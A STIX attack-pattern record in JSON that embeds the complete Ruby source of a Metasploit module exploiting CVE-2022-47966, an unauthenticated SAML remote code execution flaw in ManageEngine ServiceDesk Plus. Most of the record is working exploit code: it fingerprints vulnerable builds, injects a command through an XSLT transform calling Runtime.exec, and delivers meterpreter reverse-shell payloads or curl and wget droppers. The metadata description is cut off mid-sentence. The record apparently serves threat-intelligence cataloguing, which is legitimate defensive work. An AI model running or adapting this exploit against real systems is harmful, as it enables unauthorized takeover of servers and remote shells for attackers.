{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b54303c2-c4cb-46e4-8bb0-b5becd5369bc",
    "created": "2024-08-14T17:08:39.718702Z",
    "modified": "2024-08-14T17:08:39.718706Z",
    "name": "ManageEngine ServiceDesk Plus Unauthenticated SAML RCE",
    "description": " This exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine ServiceDesk Plus versions 14003 and",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb",
            "external_id": "manageengine_servicedesk_plus_saml_rce_cve_2022_47966.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-47966"
        },
        {
            "source_name": "reference",
            "url": "https://blog.viettelcybersecurity.com/saml-show-stopper/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horizon3ai/CVE-2022-47966"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ServiceDesk Plus Unauthenticated SAML RCE',\n        'Description' => %q{\n          This exploits an unauthenticated remote code execution vulnerability\n          that affects Zoho ManageEngine ServiceDesk Plus versions 14003 and\n          below (CVE-2022-47966). Due to a dependency to an outdated library\n          (Apache Santuario version 1.4.1), it is possible to execute arbitrary\n          code by providing a crafted `samlResponse` XML to the ServiceDesk Plus\n          SAML endpoint. Note that the target is only vulnerable if it has been\n          configured with SAML-based SSO at least once in the past, regardless of\n          the current SAML-based SSO status.\n        },\n        'Author' => [\n          'Khoa Dinh', # Original research\n          'horizon3ai', # PoC\n          'Christophe De La Fuente' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-47966'],\n          ['URL', 'https://blog.viettelcybersecurity.com/saml-show-stopper/'],\n          ['URL', 'https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/'],\n          ['URL', 'https://github.com/horizon3ai/CVE-2022-47966'],\n          ['URL', 'https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis']\n        ],\n        'Platform' => ['win', 'unix', 'linux'],\n        'Payload' => {\n          'BadChars' => \"\\x27\"\n        },\n        'Targets' => [\n          [\n            'Windows EXE Dropper',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_dropper,\n              'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => { 'Payload' => 'cmd/unix/python/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' },\n              'CmdStagerFlavor' => %w[curl wget echo lwprequest]\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 8080\n        },\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2023-01-10',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE,],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The SAML endpoint URL', '/SamlResponseServlet' ]),\n      OptInt.new('DELAY', [ true, 'Number of seconds to wait between each request', 5 ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'])\n    )\n    return CheckCode::Unknown unless res\n\n    # vulnerable servers respond with 400 and a HTML body\n    return CheckCode::Safe unless res.code == 400\n\n    script = res.get_html_document.xpath('//script[contains(text(), \"BUILD_NUMBER\")]')\n    info = script.text.match(/PRODUCT_NAME\\\\x22\\\\x3A\\\\x22(?<product>.+?)\\\\x22,.*BUILD_NUMBER\\\\x22\\\\x3A\\\\x22(?<build>[0-9]+?)\\\\x22,/)\n    return CheckCode::Unknown unless info\n    unless info[:product] == 'ManageEngine\\\\x20ServiceDesk\\\\x20Plus'\n      return CheckCode::Safe(\"This is not ManageEngine ServiceDesk Plus (#{info[:product]})\")\n    end\n\n    # SAML 2.0 support has been added in build 10511\n    # see https://www.manageengine.com/products/service-desk/on-premises/readme.html#readme105\n    build = Rex::Version.new(info[:build])\n    unless build >= Rex::Version.new('10511') && build <= Rex::Version.new('14003')\n      return CheckCode::Safe(\"Target build is #{info[:build]}\")\n    end\n\n    CheckCode::Appears\n  end\n\n  def encode_begin(real_payload, reqs)\n    super\n\n    reqs['EncapsulationRoutine'] = proc do |_reqs, raw|\n      raw.start_with?('powershell') ? raw.gsub('$', '`$') : raw\n    end\n  end\n\n  def exploit\n    case target['Type']\n    when :windows_command, :unix_cmd\n      execute_command(payload.encoded)\n    when :windows_dropper, :linux_dropper\n      execute_cmdstager(delay: datastore['DELAY'])\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    case target['Type']\n    when :windows_dropper\n      cmd = \"cmd /c #{cmd}\"\n    when :unix_cmd, :linux_dropper\n      cmd = cmd.gsub(' ') { '${IFS}' }\n      cmd = \"bash -c #{cmd}\"\n    end\n    cmd = cmd.encode(xml: :attr).gsub('\"', '')\n\n    assertion_id = \"_#{SecureRandom.uuid}\"\n    # Randomize variable names and make sure they are all different using a Set\n    vars = Set.new\n    loop do\n      vars << Rex::Text.rand_text_alpha_lower(5..8)\n      break unless vars.size < 3\n    end\n    vars = vars.to_a\n    saml = <<~EOS\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <samlp:Response\n        ID=\"_#{SecureRandom.uuid}\"\n        InResponseTo=\"_#{Rex::Text.rand_text_hex(32)}\"\n        IssueInstant=\"#{Time.now.iso8601}\" Version=\"2.0\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n        <samlp:Status>\n          <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n        </samlp:Status>\n        <Assertion ID=\"#{assertion_id}\"\n          IssueInstant=\"#{Time.now.iso8601}\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n          <Issuer>#{Rex::Text.rand_text_alphanumeric(3..10)}</Issuer>\n          <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n            <ds:SignedInfo>\n              <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n              <ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/>\n              <ds:Reference URI=\"##{assertion_id}\">\n                <ds:Transforms>\n                  <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n                  <ds:Transform Algorithm=\"http://www.w3.org/TR/1999/REC-xslt-19991116\">\n                    <xsl:stylesheet version=\"1.0\"\n                      xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n                      xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n                      <xsl:template match=\"/\">\n                        <xsl:variable name=\"#{vars[0]}\" select=\"rt:getRuntime()\"/>\n                        <xsl:variable name=\"#{vars[1]}\" select=\"rt:exec($#{vars[0]},'#{cmd}')\"/>\n                        <xsl:variable name=\"#{vars[2]}\" select=\"ob:toString($#{vars[1]})\"/>\n                        <xsl:value-of select=\"$#{vars[2]}\"/>\n                      </xsl:template>\n                    </xsl:stylesheet>\n                  </ds:Transform>\n                </ds:Transforms>\n                <ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>\n                <ds:DigestValue>#{Rex::Text.encode_base64(SecureRandom.random_bytes(32))}</ds:DigestValue>\n              </ds:Reference>\n            </ds:SignedInfo>\n            <ds:SignatureValue>#{Rex::Text.encode_base64(SecureRandom.random_bytes(rand(128..256)))}</ds:SignatureValue>\n            <ds:KeyInfo/>\n          </ds:Signature>\n        </Assertion>\n      </samlp:Response>\n    EOS\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI']),\n      'vars_post' => {\n        'SAMLResponse' => Rex::Text.encode_base64(saml)\n      }\n    })\n\n    unless res&.code == 500\n      lines = res.get_html_document.xpath('//body').text.lines.reject { |l| l.strip.empty? }.map(&:strip)\n      unless lines.any? { |l| l.include?('URL blocked as maximum access limit for the page is exceeded') }\n        elog(\"Unkown error returned:\\n#{lines.join(\"\\n\")}\")\n        fail_with(Failure::Unknown, \"Unknown error returned (HTTP code: #{res&.code}). See logs for details.\")\n      end\n      fail_with(Failure::NoAccess, 'Maximum access limit exceeded (wait at least 1 minute and increase the DELAY option value)')\n    end\n\n    res\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-01-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}